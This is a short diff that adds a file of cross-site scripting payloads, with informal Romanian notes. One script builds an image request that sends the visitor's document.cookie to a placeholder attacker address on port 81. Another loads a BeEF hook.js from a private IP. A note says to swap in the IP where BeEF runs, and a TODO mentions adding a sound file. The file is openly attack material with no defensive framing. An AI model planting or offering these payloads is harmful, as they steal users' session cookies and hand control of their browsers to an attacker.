@@ -1,0 +1,23 @@
+<script>
+
+document.write('<img src=http://ATTACKER_IP:81/?cookie=');
+
+document.write(unescape(document.cookie));
+
+document.write('>');
+
+</script>
+
+
+
+
+
+
+
+<script src='http://172.30.115.168:3000/hook.js'></script>
+
+se inlocuieste ip-ul cu cel pe care ruleaza beef
+
+
+
+de pus aici un wav fain!!!!! TODO
